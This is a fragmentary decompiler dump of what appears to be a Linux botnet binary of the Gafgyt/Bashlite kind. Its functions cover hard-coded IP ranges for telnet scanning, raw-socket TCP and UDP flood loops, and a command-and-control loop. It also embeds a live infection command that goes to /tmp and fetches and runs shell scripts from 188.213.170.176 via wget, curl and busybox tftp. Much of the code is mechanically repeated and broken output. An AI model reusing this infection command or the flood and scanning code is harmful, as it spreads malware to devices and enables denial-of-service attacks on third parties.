        szprintf(v235, (int32_t)"45.120.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v236, (int32_t)"45.115.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v237, (int32_t)"43.252.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v238, (int32_t)"43.230.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v239, (int32_t)"43.240.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v240, (int32_t)"43.245.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v241, (int32_t)"41.174.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v242, (int32_t)"49.118.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v243, (int32_t)"78.188.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v244, (int32_t)"45.127.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v245, (int32_t)"103.30.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v246, (int32_t)"14.33.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v247, (int32_t)"123.16.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v248, (int32_t)"202.44.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v249, (int32_t)"116.93.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v250, (int32_t)"91.83.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v251, (int32_t)"41.253.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v252, (int32_t)"117.173.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v253, (int32_t)"113.190.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v254, (int32_t)"146.88.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v255, (int32_t)"112.196.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v256, (int32_t)"113.178.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v257, (int32_t)"112.45.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v258, (int32_t)"183.223.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v259, (int32_t)"116.71.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v260, (int32_t)"103.44.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v261, (int32_t)"110.235.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v262, (int32_t)"124.253.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v263, (int32_t)"211.237.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v264, (int32_t)"117.175.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v265, (int32_t)"117.173.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v266, (int32_t)"178.93.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v267, (int32_t)"111.9.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v268, (int32_t)"222.252.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v269, (int32_t)"113.174.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v270, (int32_t)"222.252.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v271, (int32_t)"113.160.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v272, (int32_t)"113.161.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v273, (int32_t)"113.162.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v274, (int32_t)"113.163.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v275, (int32_t)"113.164.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v276, (int32_t)"113.165.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v277, (int32_t)"113.166.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v278, (int32_t)"113.167.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v279, (int32_t)"113.168.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v280, (int32_t)"113.169.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v281, (int32_t)"123.17.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v282, (int32_t)"123.18.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v283, (int32_t)"123.19.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v284, (int32_t)"123.20.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v285, (int32_t)"123.21.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v286, (int32_t)"123.22.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v287, (int32_t)"222.252.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v288, (int32_t)"222.253.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v289, (int32_t)"222.254.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v290, (int32_t)"222.255.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v291, (int32_t)"37.247.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v292, (int32_t)"41.208.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v293, (int32_t)"183.220.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v294, (int32_t)"175.201.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v295, (int32_t)"103.198.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v296, (int32_t)"183.223.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v297, (int32_t)"50.205.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v298, (int32_t)"88.248.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v299, (int32_t)"88.105.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v300, (int32_t)"88.247.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v301, (int32_t)"85.105.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v302, (int32_t)"188.3.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v303, (int32_t)"103.203.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v304, (int32_t)"103.55.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v305, (int32_t)"103.220.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v306, (int32_t)"183.233.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v307, (int32_t)"103.242.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v308, (int32_t)"103.198.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v309, (int32_t)"103.14.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v310, (int32_t)"103.195.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v311, (int32_t)"103.203.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v312, (int32_t)"103.214.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v313, (int32_t)"103.218.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v314, (int32_t)"103.225.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v315, (int32_t)"103.228.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v316, (int32_t)"103.231.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v317, (int32_t)"103.60.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v318, (int32_t)"103.248.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v319, (int32_t)"103.253.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v320, (int32_t)"103.255.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v321, (int32_t)"103.35.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v322, (int32_t)"103.49.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v323, (int32_t)"103.62.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v324, (int32_t)"144.48.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v325, (int32_t)"163.47.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v326, (int32_t)"163.53.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v327, (int32_t)"223.29.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v328, (int32_t)"59.153.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v329, (int32_t)"113.176.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v330, (int32_t)"113.175.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v331, (int32_t)"113.177.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v332, (int32_t)"113.183.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v333, (int32_t)"202.164.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v334, (int32_t)"203.134.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v335, (int32_t)"210.56.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v336, (int32_t)"49.156.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v337, (int32_t)"203.210.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v338, (int32_t)"117.181.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v339, (int32_t)"117.178.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v340, (int32_t)"117.177.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v341, (int32_t)"117.176.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v342, (int32_t)"117.170.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v343, (int32_t)"117.171.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v344, (int32_t)"117.162.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v344, (int32_t)"112.26.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v345, (int32_t)"112.27.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v346, (int32_t)"112.28.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v347, (int32_t)"112.29.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v348, (int32_t)"112.30.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v349, (int32_t)"112.31.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v350, (int32_t)"203.150.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v352, (int32_t)"50.233.%d.%d", (int32_t)v131, (int32_t)v132);
    return inet_addr(v351);
=================FUNCTION : sysconf ===================
++++++++ FUNCTION START 48745
++++++++ FUNCTION END 49660
++++++++ FUNCTION LENGTH 915
        case 0: {
        case 1: {
        case 2: {
        case 3: {
        case 4: {
            getdtablesize((int32_t)&v133);
        case 5: {
        case 6: {
        case 7: {
        case 8: {
        case 9: {
        case 10: {
        case 11: {
        case 12: {
        case 13: {
        case 14: {
        case 15: {
        case 16: {
        case 17: {
        case 18: {
        case 19: {
        case 20: {
        case 21: {
        case 22: {
        case 23: {
        case 24: {
        case 25: {
        case 26: {
        case 27: {
        case 28: {
        case 29: {
        case 30: {
            __GI_getpagesize();
        case 31: {
        case 32: {
        case 33: {
        case 34: {
        case 35: {
        case 36: {
        case 37: {
        case 38: {
        case 39: {
        case 40: {
        case 41: {
        case 42: {
        case 43: {
        case 44: {
        case 45: {
        case 46: {
        case 47: {
        case 48: {
        case 49: {
        case 50: {
        case 51: {
        case 52: {
        case 53: {
        case 54: {
        case 55: {
        case 56: {
        case 57: {
        case 58: {
        case 59: {
        case 60: {
        case 61: {
        case 62: {
        case 63: {
        case 64: {
        case 65: {
        case 66: {
        case 67: {
        case 68: {
        case 69: {
        case 70: {
        case 71: {
        case 72: {
        case 73: {
        case 74: {
        case 75: {
        case 76: {
        case 77: {
        case 78: {
        case 79: {
        case 80: {
        case 81: {
        case 82: {
        case 83: {
        case 84: {
        case 85: {
        case 86: {
        case 87: {
        case 88: {
        case 89: {
        case 90: {
        case 91: {
        case 92: {
        case 93: {
        case 94: {
        case 95: {
        case 96: {
        case 97: {
        case 98: {
        case 99: {
        case 100: {
        case 101: {
        case 102: {
        case 103: {
        case 104: {
        case 105: {
        case 106: {
        case 107: {
        case 108: {
        case 109: {
        case 110: {
        case 111: {
        case 112: {
        case 113: {
        case 114: {
        case 115: {
        case 116: {
        case 117: {
        case 118: {
        case 119: {
        case 120: {
        case 121: {
        case 122: {
        case 123: {
        case 124: {
        case 125: {
        case 126: {
        case 127: {
        case 128: {
        case 129: {
        case 130: {
        case 131: {
        case 149: {
            if (__GI_clock_getres(1, NULL, 149, 149) >= 0) {
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 60470
++++++++ FUNCTION END 61646
++++++++ FUNCTION LENGTH 1176
                        while (true) {
                                __libc_close(-1);
                                    if (inet_pton(-1, (char *)v147, v149, (int32_t)&v142) >= 1) {
                                        inet_addr(-1);
                                    if (socket(-1, v147, v149) >= 0) {
                                        if (__libc_connect(-1, v147, v149) >= 0) {
                                            __libc_send(-1, v147, v149, (int32_t)&v142);
                                                int32_t v164 = __libc_recv(-1, v147, v149, (int32_t)&v142); // 0x8055ff6
                                                                            __libc_close(v137);
                                                                        free(v138);
                                                                        free(v138);
                                                                            while (true) {
                                                                                        __libc_close(-1);
                                                                                            free(-1);
                                                                                            free(-1);
                                                                                        free(-1);
                                                                                        free(-1);
                                                                                                free(-1);
                                                                                                __libc_close(-1);
                                                                                                    free(-1);
                                                                                                    free(-1);
                                                                                                free(-1);
                                                                                                    __libc_close(-1);
                                                                                                        free(-1);
                                                                                                        free(-1);
                                                                                                    free(-1);
                                                                                                __libc_close(-1);
                                                                                                    free(-1);
                                                                                                    free(-1);
                                                                                                free(-1);
                                                                                            free(-1);
                                                                                            v203 = __libc_close(-1);
                                                                                                v204 = free(-1);
                                                                                                v205 = free(-1);
                                                                                            v205 = free(-1);
                                                                                    v203 = __libc_close(-1);
                                                                                        v204 = free(-1);
                                                                                        v205 = free(-1);
                                                                                    v205 = free(-1);
                                                                            __libc_close(-1);
                                                                                free(-1);
                                                                                free(-1);
                                                                            free(-1);
                                                                            free(-1);
                                                                        __libc_close(-1);
                                                                            free(-1);
                                                                            free(-1);
                                                                    __libc_close(-1);
                                                                        free(-1);
                                                                    __libc_close(v137);
                                                                free(v138);
                                                                free(v138);
                                                                __libc_close(v137);
                                                            free(v138);
                                                            free(v138);
                                    __libc_close(v137);
                                free(v138);
                                free(v138);
                                __libc_close(v137);
                            free(v138);
                            free(v138);
                    __libc_close(v137);
                free(v138);
                free(v138);
                __libc_close(v137);
            free(v138);
            free(v138);
            __libc_close(v137);
        free(v138);
        free(v138);
        __libc_close(v137);
    free(v138);
    free(v138);
=================FUNCTION : main ===================
++++++++ FUNCTION START 24715
++++++++ FUNCTION END 25357
++++++++ FUNCTION LENGTH 642
    if (geteuid() == 0) {
    getBuild();
    int32_t v133 = __GI_inet_ntoa(v132); // 0x8050c13
    printf("BUILD %s:%s\n", (char *)getBuild(), (char *)v133);
    sprintf(v139, v129);
    int32_t v141 = v140 ^ __libc_getpid(); // 0x8050cac
    srand(v141);
    int32_t v143 = v142 ^ __libc_getpid(); // 0x8050cce
    init_rand(v143);
    getOurIP();
    int32_t v144 = __libc_fork(v143); // 0x8050cde
        if (__libc_fork((int32_t)v128) != 0) {
        while (true) {
            if (initConnection() != 0) {
                while (true) {
                    if (initConnection() == 0) {
                getBuild();
                __GI_inet_ntoa(v148);
                HackerPrint(v148, 1);
                while (true) {
                    while (true) {
                        while (true) {
                            if (recvLine() == -1) {
                            while (true) {
                                            v171 = __libc_waitpid(v164, v161, v163);
                                                while (true) {
                                                            while (true) {
                                                                        free(0);
                                    if (strstr(v169, (char *)&v177) != v156) {
                                        int32_t v178 = strstr(v169, (char *)&v177); // 0x805102c
                                                while (true) {
                                                    while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                                while (true) {
                                                                                processCmd();
                                                                                    free(v216);
                                                                                        free(v216);
                                                                                    while (true) {
                                                                                while (true) {
                                                                            processCmd();
                                                                            if (listFork() != 0) {
                                                                            szprintf(5, (int32_t)"MOVE", v186, v186);
                                                                            int32_t v218 = fdpopen(); // 0x805122a
                                                                            while (true) {
                                                                                if (fdgets(v218, v158, v127) != 0) {
                                                                                    fdpclose();
                                        HackerPrint(v169, (int32_t)&v177);
                                    while (true) {
                                v171 = __libc_waitpid(v164, v161, v163);
            getBuild();
            __GI_inet_ntoa(v148);
            HackerPrint(v148, 1);
        __libc_waitpid(v144, (int32_t)&v221, 0);
    while (true) {
        if (initConnection() == 0) {
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 55640
++++++++ FUNCTION END 59096
++++++++ FUNCTION LENGTH 3456
        while (true) {
            while (true) {
                            while (true) {
                                                                    while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                        while (true) {
                                                        while (true) {
                                                    while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                    while (true) {
                                                    while (true) {
                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                        while (true) {
                                                        while (true) {
                                                            while (true) {
                                                    while (true) {
                                                        while (true) {
                                                while (true) {
                                                    while (true) {
                                            while (true) {
                        while (true) {
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 3609
++++++++ FUNCTION END 4073
++++++++ FUNCTION LENGTH 464
                    v141 = __vfork(v136);
                        __libc_close(v133);
                        __libc_close(v135);
                            __libc_close(v133);
                            __libc_close(v135);
                            __libc_close(v133);
                        __libc_close(v135);
                            __libc_close(v135);
                        __libc_close(v133);
                v138 = getdtablesize(v136);
                        v141 = __vfork(v136);
                            __libc_close(v133);
                            __libc_close(v135);
                                __libc_close(v133);
                                __libc_close(v135);
                                __libc_close(v133);
                            __libc_close(v135);
                                __libc_close(v135);
                            __libc_close(v133);
                    v141 = __vfork(v136);
                        __libc_close(v133);
                        __libc_close(v135);
                            __libc_close(v133);
                            __libc_close(v135);
                            __libc_close(v133);
                        __libc_close(v135);
                            __libc_close(v135);
                        __libc_close(v133);
                v138 = getdtablesize(v136);
                        v141 = __vfork(v136);
                            __libc_close(v133);
                            __libc_close(v135);
                                __libc_close(v133);
                                __libc_close(v135);
                                __libc_close(v133);
                            __libc_close(v135);
                                __libc_close(v135);
                            __libc_close(v133);
=================FUNCTION : _init ===================
++++++++ FUNCTION START 320
++++++++ FUNCTION END 637
++++++++ FUNCTION LENGTH 317
        "wget",
        "/dev/netslink/",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
        "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
        "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)"
        "etrbhhgetrb",
        "http",
        "Unknown host",
        "Host name lookup failure",
    char (*v42)[318] = "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n";
    __get_pc_thunk_bx(0);
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 38175
++++++++ FUNCTION END 38732
++++++++ FUNCTION LENGTH 557
    int32_t v133 = __get_hosts_byname_r(a1, 2, v130, a4, a5, a6, v132); // 0x8052df5
                            if (inet_aton(v152, a3) != 0) {
                            __open_nameservers();
                            v155 = __dns_lookup(v152, 1, v139, (int32_t)&v138, v154, (int32_t)&v142);
                                    free(v142);
                                        free(v140);
                                        free(v140);
                                free(v142);
                                free(v140);
                                if (inet_aton(v152, a3) != 0) {
                                __open_nameservers();
                                v155 = __dns_lookup(v152, 1, v139, (int32_t)&v138, v154, (int32_t)&v142);
                                        free(v142);
                                            free(v140);
                                            free(v140);
                                    free(v142);
                                    free(v140);
        if (inet_aton(v152, a3) != 0) {
        __open_nameservers();
        v155 = __dns_lookup(v152, 1, v139, (int32_t)&v138, v154, (int32_t)&v142);
                free(v142);
                    free(v140);
                    free(v140);
            free(v142);
            free(v140);
        if (inet_aton(v152, a3) != 0) {
        __open_nameservers();
        v155 = __dns_lookup(v152, 1, v139, (int32_t)&v138, v154, (int32_t)&v142);
                free(v142);
                    free(v140);
                    free(v140);
            free(v142);
            free(v140);
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 12672
++++++++ FUNCTION END 13129
++++++++ FUNCTION LENGTH 457
        rand_cmwc(v133);
    int32_t result = getHost(a1, &v135); // 0x804e711
    int32_t v137 = socket(2, 3, 6); // 0x804e73e
        return HackerPrint(v138, (int32_t)"Failed opening raw socket.");
    if (__GI_setsockopt(v137, 0, 3, (int32_t)&v139, 4) >= 0) {
        *v142 = (int16_t)(0x10000 * rand_cmwc(v141) / 0x10000);
        int32_t v143 = rand_cmwc(v141); // 0x804e853
                while (true) {
                        int32_t v173 = ((int32_t)(v171 | _strncmp(v158, "rst", 4) % 2 == 0) | v172) ^ 1; // 0x804e96d
                                    int32_t v183 = ((int32_t)(v181 | _strncmp(v158, "psh", 4) % 2 == 0) | v182) ^ 1; // 0x804ea60
                                        HackerPrint(4, (int32_t)"psh");
                                        v167 = "psh";
                                        v167 = "psh";
                rand_cmwc((int32_t)v162);
                    v151 = rand_cmwc((int32_t)v158);
                *v154 = (int16_t)tcpcsum();
                while (true) {
                    __libc_sendto(v150, v139, v134, v135, v136, 0);
                    *(int16_t *)(v140 | 4) = (int16_t)(0x10000 * rand_cmwc(v150) / 0x10000);
                    *v144 = rand_cmwc(v150);
                    *v142 = (int16_t)(0x10000 * rand_cmwc(v150) / 0x10000);
                    *v154 = (int16_t)tcpcsum();
        rand_cmwc((int32_t)v158);
            v151 = rand_cmwc((int32_t)v158);
        *v154 = (int16_t)tcpcsum();
        while (true) {
            __libc_sendto(v150, v139, v134, v135, v136, 0);
            *(int16_t *)(v140 | 4) = (int16_t)(0x10000 * rand_cmwc(v150) / 0x10000);
            *v144 = rand_cmwc(v150);
            *v142 = (int16_t)(0x10000 * rand_cmwc(v150) / 0x10000);
            *v154 = (int16_t)tcpcsum();
        result3 = HackerPrint(v138, (int32_t)"Failed setting raw headers mode.");
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 40910
++++++++ FUNCTION END 44603
++++++++ FUNCTION LENGTH 3693
                while (true) {
                    while (true) {
                            while (true) {
                                    while (true) {
                                                                                                    free(v244);
                                                                                                free(v244);
                                                                                        free(v244);
                                                                                    free(v244);
                                                                                            free(v244);
                                                                                            free(v244);
                                                                                        free(v244);
                                                                                    free(v244);
                                                                                    free(v244);
                                                                                free(v244);
                                                                        free(v244);
                                                                        free(v244);
                                                                    free(v244);
                                                                            free(v244);
                                                                            free(v244);
                                                                        free(v244);
                while (true) {
                while (true) {
            while (true) {
                                                                    free(v140 + 8);
                                                                    free(v140 + 8);
                                                                free(v140 + 8);
                                                        free(v140 + 8);
                                                        free(v140 + 8);
                                                    free(v140 + 8);
                                                            free(v140 + 8);
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 10310
++++++++ FUNCTION END 11034
++++++++ FUNCTION LENGTH 724
    int32_t v133 = v132 ^ rand_cmwc(0); // 0x804c83d
    srand(v133);
    while (true) {
                case 0: {
                                    socket(0x10000 * v155 / 0x10000, v156, v154);
                                        if (__libc_connect(v156, v154, 0) == -1) {
                                                sclose(v156);
                    socket(0x10000 * v155 / 0x10000, v156, v154);
                case 1: {
                            sclose(v152);
                            sclose(v167);
                        getsockopt(v152, v168, v165, 10, v161);
                            sclose(v152);
                case 2: {
                case 3: {
                    if (__libc_send(v169, v137, v148, v134) >= 0) {
                        if (__libc_send(v169, v137, v148, v134) >= 0) {
                case 4: {
                case 5: {
                    if (__libc_send(v170, v140, v137, v148) >= 0) {
                        if (__libc_send(v170, v140, v137, v148) >= 0) {
                case 6: {
                                    get_telstate_host();
                                    HackerPrint(v142, v140);
                                    get_telstate_host();
                                    HackerPrint(v142, v140);
                case 7: {
                    if (__libc_send(v173, v142, v140, v137) >= 0) {
                        sclose(v173);
        while (true) {
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 69155
++++++++ FUNCTION END 69781
++++++++ FUNCTION LENGTH 626
            if (fgets(v150, v135, v133) != 0) {
                while (true) {
                    __GI_fclose((int16_t *)v135);
                            v143 = __open_etc_hosts();
                            if (fgets(v150, v135, v133) != 0) {
                                while (true) {
                                    __GI_fclose((int16_t *)v135);
                            v143 = __open_etc_hosts();
                            if (fgets(v150, v135, v133) != 0) {
                                while (true) {
                                    __GI_fclose((int16_t *)v135);
    if (fgets(v150, v135, v133) != 0) {
        while (true) {
            while (true) {
                    while (true) {
                            while (true) {
                                        while (true) {
                                            while (true) {
                                                int32_t v177 = __GI_strcasecmp(v149, v176, v155, v155); // 0x8057aa2
                                            if (fgets(v150, v135, v133) == 0) {
                                                    if (inet_pton(10, (char *)v180, v137, v156) >= 1) {
                                                            __GI_fclose((int16_t *)v135);
                                                if (inet_pton(2, (char *)v182, (int32_t)v138, v134) >= 1) {
                                                        __GI_fclose((int16_t *)v135);
                                            if (fgets(v150, v135, v133) == 0) {
                                    if (fgets(v150, v135, v133) == 0) {
                                __GI_fclose((int16_t *)v135);
            __GI_fclose((int16_t *)v135);
=================FUNCTION : prints ===================
++++++++ FUNCTION START 2016
++++++++ FUNCTION END 2498
++++++++ FUNCTION LENGTH 482
                    while (true) {
                        printchar(v135, v134);
                        printchar(v135, v134);
                            printchar(v135, v134);
                    printchar(v135, (int32_t)*a2);
                        printchar(v135, (int32_t)*v140);
                    printchar(v135, v134);
                        printchar(v135, v134);
                printchar(v135, v134);
                    printchar(v135, v134);
            printchar(v135, (int32_t)*a2);
                printchar(v135, (int32_t)*v140);
            printchar(v135, v134);
                printchar(v135, v134);
            while (true) {
                printchar(v135, v134);
                printchar(v135, v134);
                    printchar(v135, v134);
            printchar(v135, (int32_t)*a2);
                printchar(v135, (int32_t)*v140);
            printchar(v135, v134);
                printchar(v135, v134);
        printchar(v135, v134);
            printchar(v135, v134);
    printchar(v135, (int32_t)*a2);
        printchar(v135, (int32_t)*v140);
    printchar(v135, v134);
        printchar(v135, v134);
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 12180
++++++++ FUNCTION END 12508
++++++++ FUNCTION LENGTH 328
        rand_cmwc(2);
    int32_t result = getHost(a1, &v135); // 0x804e204
        int32_t v137 = socket(2, 2, 17); // 0x804e240
                makeRandomStr(v140, a5);
                while (true) {
                    __libc_sendto(v137, v139, a5, 0, (int32_t)&v134, 16);
                            rand_cmwc(v137);
            result3 = HackerPrint(v136, (int32_t)"Failed opening raw socket.");
    int32_t v143 = socket(2, 3, 17); // 0x804e32b
        if (__GI_setsockopt(v143, 0, 3, (int32_t)&v144, 4) < 0) {
            result4 = HackerPrint(v136, (int32_t)"Failed setting raw headers mode.");
        int32_t v147 = v146 ^ rand_cmwc(0); // 0x804e3b2
        srand(v147);
        init_rand(random());
            v147 = v146 ^ rand_cmwc(0);
            srand(v147);
